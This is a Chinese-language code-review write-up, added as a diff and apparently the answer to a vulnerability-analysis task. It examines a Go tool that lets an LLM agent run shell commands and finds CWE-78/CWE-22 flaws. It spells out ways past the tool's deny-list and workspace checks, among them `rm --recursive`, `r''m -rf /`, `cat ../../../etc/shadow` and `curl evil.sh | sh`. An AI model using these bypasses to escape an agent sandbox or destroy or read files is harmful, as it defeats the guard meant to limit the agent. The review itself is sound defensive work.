@@ -1,0 +1,37 @@
+# 编号分析
+
+**1. 入口点枚举（全文通读）**
+- 第 66-70 行：`Execute` 从 `args["command"]` 读取任意字符串命令 —— 唯一外部 source。
+- 第 71-73 行：`args["working_dir"]` 可完全覆盖工作目录（第二入口）。
+- 第 84-89 行：命令直接交给 `sh -c` / `powershell -Command` 执行 —— sink。
+- 其余函数（Name/Description/Parameters/SetTimeout/SetRestrictToWorkspace/SetAllowPatterns，第 160-190 行）无数据流风险。
+
+**2. guardCommand 防御有效性验证（第 118-158 行）**
+
+- **黑名单正则（第 119-127 行）**：按题目规则视为可绕过。事实上也确实可绕过：如 `rm -r -f`、`rm --recursive`、base64 编码、变量拼接 `r''m -rf /`、`find -delete`、`shred`、`truncate` 等均不匹配任何模式。黑名单对 shell 注入型工具本质无效。
+- **allowlist（第 128-139 行）**：仅当调用方显式设置才生效；默认为 nil，不构成防御。
+- **restrictToWorkspace 路径检查（第 141-157 行）**：
+  - 第 142-144 行：仅检查字面 `../`、`..\` 子串，可用 `$HOME`、`~`、环境变量、符号链接、URL 编码等绕过；且只检查命令文本而非实际行为。
+  - 第 146-149 行：`filepath.Abs(cwd)` 失败时直接 `return ""` 放行（fail-open）。
+  - 第 150-151 行的正则 `[A-Za-z]:\\[^\\\"']+|/[^\s\"']+` 只提取“看起来像绝对路径”的 token；相对路径写法（如 `cat ../../../etc/shadow` 中间段）、引号包裹路径、反引号/子 shell 生成的路径全部漏检。
+  - 最关键：即使所有路径检查通过，命令本身是任意 shell —— `curl evil.sh | sh`、`python -c ...`、`git clone && cd ..` 等均可逃逸出 workspace。
+
+**3. 第二入口与替代通道**
+- 第 71-73 行 `working_dir` 完全由调用者控制且未做任何校验，可直接设为 `/` 或 `C:\`，使 restrict 检查的基准目录失效。
+- 输出回传（第 95-99、110-113 行）：stdout/stderr 全量返回给 LLM，可泄露任意文件内容（配合上述逃逸），属于信息泄露放大器。
+- 无认证/授权层、无审计日志、无用户确认机制。
+
+**4. 结论**
+source（第 67 行 LLM 提供的 command 字符串）→ 弱过滤（第 119-157 行，黑名单+子串匹配，均可绕过）→ sink（第 85-88 行 `exec.CommandContext(cmdCtx, "sh", "-c", command)`）。这是典型的 CWE-78 OS 命令注入 / 不受控命令执行，且路径限制 fail-open。该工具设计上就是让 LLM 执行 shell，但安全防护形同虚设，在多租户或不可信 prompt 场景下属高危。
+
+```json
+{
+  "has_vulnerability": true,
+  "vulnerability_type": "CWE-78 (OS Command Injection) / CWE-22 (Path Traversal, fail-open)",
+  "risk_level": "high",
+  "source": "line 67: args['command'] 与 line 72: args['working_dir'] 均来自外部输入",
+  "sink": "line 85-88: exec.CommandContext(cmdCtx, 'sh', '-c', command) 直接执行任意 shell",
+  "explanation": "LLM 控制的 command 字符串经 guardCommand 过滤后传入 sh -c 执行。deny 黑名单正则(第119-127行)可被 rm --recursive、编码、变量拼接等方式绕过; restrictToWorkspace 的 '../' 子串检查(第142-144行)与路径正则(第150行)无法覆盖相对路径、变量展开和子shell; cwd Abs 失败时(第148-149行)直接放行(fail-open); working_dir 参数(第72行)未经校验可将基准目录设为根; curl|sh 等方式可完全逃逸 workspace 并读写任意文件, 结果经 stdout 回传给 LLM 造成信息泄露",
+  "fix_suggestion": "line 85-88: 废弃字符串拼 shell 的模式, 改为白名单化的参数化执行(exec.Command 固定二进制 + 分离的 argv, 禁止 sh -c); 对 working_dir 做 filepath.EvalSymlinks 后强制前缀校验并在 Abs 失败时拒绝而非放行; 移除黑名单依赖, 默认启用 allowlist 并要求人工确认高危操作"
+}
+```
